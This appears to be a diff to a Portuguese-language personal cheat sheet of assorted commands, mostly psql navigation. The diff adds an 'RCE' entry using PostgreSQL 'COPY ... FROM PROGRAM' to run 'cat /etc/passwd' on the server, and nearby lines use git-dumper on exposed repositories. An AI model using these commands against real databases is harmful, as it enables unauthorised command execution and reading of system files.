@@ -7372,11 +7372,16 @@ Tags: `#comandos-avulsos` `#misc` `Coammandos aleatorios`
 
 	psql "postgresql://user:pass@host:5432/crm?sslmode=disable" | echo "Se o servidor reclamar de encriptação se aparecer FATAL error para o teu IP é que tem allow list"
 	psql -h host -U user -d database
-	\l LISTA TABLEAS EXISTENTES
+	\conninfo
+	\l LISTA TABELAS EXISTENTES
 	\c DATABASE_NAME
 	\dt LISTA AS TABELAS
 	\d TABLE_NAME OU \d+ TABLE NAME
 	SELECT * FROM table_name
+	RCE
+	COPY public.cmd_output FROM PROGRAM 'cat /etc/passwd';
+	SELECT * FROM public.cmd_output;
+
 
 	git-dumper | echo "BAIXA O GIT EXPOSTO"
 	git log --oneline | echo "LER O ARQUIVO .GIT LOCALMENTE DO GIT TRAGO"
